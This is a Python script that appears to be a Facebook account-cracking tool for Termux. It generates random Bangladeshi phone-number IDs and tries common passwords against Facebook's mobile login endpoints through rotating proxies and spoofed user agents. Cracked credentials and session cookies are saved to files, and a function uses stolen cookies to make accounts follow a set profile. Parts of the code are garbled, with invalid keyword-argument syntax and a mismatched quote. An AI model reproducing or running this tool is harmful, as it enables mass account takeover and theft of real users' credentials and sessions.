import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')

P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
    


def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            
def line():
    print("\033[1;90m———————————————————————————————————\x1b[0m")
    
class slower:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.11)
            
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;92m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()

def cek_apks(session,coki):
    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r\r%s {P}[%sâ€¢%s] %sActive Apks & Web Not Found%s         '%(N,U,N,B,N))
    else:
        print(f'\r\r {G}[â€¢] Active Apks & Web ðŸ‘‡{G}       ')
        for i in range(len(game)):
            print(f"\r\r {G}[%s] %s %s"%(i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))

    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r\r%s [%sâ€¢%s] %sExpired Apks & Web Not Found%s                '%(N,M,N,M,N))
    else:
        print(f'\r\r [{M}â€¢{P}]{M} Expired Apks & Web ðŸ‘‡{P}')
        for i in range(len(game)):
            print(f"\r\r {K}[%s]{K} %s %s"%(i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

logo=(f"""                          
       _     ________  ____
      dM.    `MMMMMMMb.`MM'
     ,MMb     MM    `Mb MM 
     d'YM.    MM     MM MM 
    ,P `Mb    MM     MM MM 
    d'  YM.   MM     MM MM 
   ,P   `Mb   MM     MM MM 
   d'    YM.  MM     MM MM 
  ,MMMMMMMMb  MM     MM MM 
  d'      YM. MM    .M9 MM 
_dM_     _dMM_MMMMMMM9'_MM_
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[0;45m      [ TOOLS CREATED BY : MD ADI ]     \033[0;92m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝                      
\033[1;32m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m═══
 Facebook ID : MD Adi
 Facebook group : bd hack
 Telegram name : bd hack
 tools version : 12.0
\033[1;32m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m═══
""")
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
#-------------linex def -------------#
def linex():
    print(f'{A}────────────────────────────────────────────────────────')
#-------------clear def -------------#
def clear():
    os.system('clear')
    print(logo)
#-------------main def------------#
loop = 0
oks = []
cps = []

from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLOADING ASSET FILES ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNO INTERNET CONNECTION ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ugen2=[]
ugen=[]
uas=[] 
user=[]
twf =[]
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:

    print(' WELCOME TO ADI-CYBER-360 WORLD ')
prox=open('.prox.txt','r').read().splitlines()

for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/535.1'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
    
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)        

def menu():
    clear()
    print(f'{G1}[{A}1{G1}]{G1} RANDOM CLONING')
    print(f'{G1}[{A}0{G1}]{G1} EXIT')
    linex()
    mtd=input(f'{G1}[{A}?{G1}]{G1} CHOOSE {A}: {G1}')
    if mtd in '1':
        ak6()
    else:
    	exit()
    


def ak():
    os.system("clear")
    print(logo)
    print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}: {G1}[{A}016{G1}]{A}•{G1}[{A}017{G1}]{A}•{G1}[{A}018{G1}]{A}•{G1}[{A}019{G1}]')
    code = input(f'{G1}[{A}?{G1}]{G1} CHOICE{A} :{G1} ')
    print("")
    os.system('clear')
    print(logo)
    print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}: {G1}[{A}1000{G1}]{A}•{G1}[{A}3000{G1}]{A}•{G1}[{A}5000{G1}]{A}•{G1}[{A}10000{G1}]')
    limit = int(input(f'{G1}[{A}?{G1}]{G1} CHOICE{A} :{G1} '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=35) as setu:
        clear()
        tl = str(len(user))
        slower(f'{G1}[{A}≈{G1}]{G1} SIM CODE{A}  : {G1}'+code)
        slower(f'{G1}[{A}≈{G1}]{G1} TOTAL ID{A}  : {G1}'+tl)
        slower(f'{G1}[{A}≈{G1}]{G1} CRACKING......')
        linex()
        for love in user:
            uid = code+love
            pwx = [love,'bangladesh','i love you']
            setu.submit(rcrack,uid,pwx,tl)
            





#mix 
def ak6():
    os.system("clear")
    try:
        heron_Brand=requests.get("https://pastebin.com/raw/RjvNE2QS").text
        if heron_Brand in ['free']:
            fb="free"
            yyy="0N"
        if heron_Brand in ['m']:
            fb="m"
            yyy="0N"
        if heron_Brand in ['mbasic']:
            fb="mbasic"
            yyy="0N"
        if heron_Brand in ['p']:
            fb="p"
            yyy="0N"
        if heron_Brand in ['x']:
            fb="x"
            yyy="0N"
    except requests.exceptions.ConnectionError:
        yyy="0ff"
    print(logo)
    print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}: {G1}[{A}016{G1}]{A}•{G1}[{A}017{G1}]{A}•{G1}[{A}018{G1}]{A}•{G1}[{A}019{G1}]')
    code = input(f'{G1}[{A}?{G1}]{G1} CHOICE{A} :{G1} ')
    linex()
    os.system('clear')
    print(logo)
    print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}: {G1}[{A}1000{G1}]{A}•{G1}[{A}3000{G1}]{A}•{G1}[{A}5000{G1}]{A}•{G1}[{A}10000{G1}]')
    limit = int(input(f'{G1}[{A}?{G1}]{G1} CHOICE{A} :{G1} '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    linex()
    print(f"{G1}[{A}1{G1}]{G1} MATHOD M")
    print(f"{G1}[{A}2{G1}]{G1} MATHOD MBASIC")
    print(f"{G1}[{A}3{G1}]{G1} MATHOD FREE")
    print(f"{G1}[{A}4{G1}]{G1} MATHOD P")
    print(f"{G1}[{A}5{G1}]{G1} MATHOD X")
    print(f"{G1}[{A}6{G1}]{G1} [6] \033[1;91mAUTO \033[1;97m[\033[1;95m{yyy}\033[1;97m]")
    line()
    gxd=input(f'{G1}[{A}?{G1}]{G1} CHOICE{A} :{G1} ')
    if gxd in ["1","M"]:
        fb="m"
    elif gxd in ["2","MBASIC"]:
        fb="mbasic"
    elif gxd in ["3","FREE"]:
        fb="free"
    elif gxd in ["4","P"]:
        fb="p"
    elif gxd in ["5","X"]:
        fb="X"
    else: pass
    with ThreadPool(max_workers=35) as setu:
        clear()
        tl = str(len(user))
        print(f'{G1}[{A}≈{G1}]{G1} SIM CODE{A}  : {G1}'+code)
        print(f'{G1}[{A}≈{G1}]{G1} TOTAL ID{A}  : {G1}'+tl)
        print(f'{G1}[{A}≈{G1}]{G1} MATHOD{A}  : {G1}{fb}')
        slower(f'{G1}[{A}≈{G1}]{G1} CRACKING......')
        linex()
        for love in user:
            uid = code+love
            bl=uid[0:6]
            lb=uid[:6]
            kb=uid[0:7]
            bk=uid[:7]
            pwx = [love,bl,lb,kb,bk,uid,'bangladesh','i love you']
            setu.submit(bcrack,uid,pwx,tl,fb)



def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write('\r\r\033[1;37m[%s%s\033[1;37m] %s|OK-\033[1;32m%s'%(GREEN,uid,loop,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority': 'mbasic.facebook.com',
            'method': 'GET',
            'path': '/login/device-based/login/async/',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'dpr': '2',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="124", "Google Chrome";v="124"',
            'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="124.0.6272.196", "Google Chrome";v="124.0.6272.196"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '"Infinix X688B"',
            'sec-ch-ua-platform': '"macOS"',
            'sec-ch-ua-platform-version': '""',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://p.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                print('\r\r\033[38;5;46m[PAPEL-OK] '+uid+ ' | ' +ps+ '\n\033[1;37m[\033[38;5;46mCOOKIE\033[38;5;196mâ€¢\033[1;37m] \033[38;5;46m'+coki+'')
                open('/sdcard/PAPEL-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                print('\r\r\033[1;31m[PAPEL-CP] '+uid+ ' | ' +ps+'')
                open('/sdcard/PAPEL-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        
    except:
        pass

def bcrack(uid,pwx,tl,fb):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            session = requests.Session()
            sys.stdout.write(f'\r\r\033[1;37m[%s%s\033[1;37m] %s[OK-\033[1;32m%s'%(GREEN,uid,loop,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            free_fb = session.get(f'https://{fb}.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
            'method': 'GET',
            'path': '/login/device-based/login/async/',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'dpr': '2',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="124", "Google Chrome";v="124"',
            'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="124.0.6272.196", "Google Chrome";v="124.0.6272.196"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '"Infinix X688B"',
            'sec-ch-ua-platform': '"macOS"',
            'sec-ch-ua-platform-version': '""',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro,
            'viewport-width': '980',}
            lo = session.post(f'https://{fb}.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb,proxies=proxs).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                print('\r\r\033[38;5;46m[PAPEL-OK] '+uid+ ' | ' +ps+ '\n\033[1;37m[\033[38;5;46mCOOKIE\033[38;5;196mâ€¢\033[1;37m] \033[38;5;46m'+coki+'')
                open('/sdcard/PAPEL-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                print('\r\r\033[1;31m[PAPEL-CP] '+uid+ ' | ' +ps+'')
                open('/sdcard/PAPEL-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        
    except:
        pass

menu()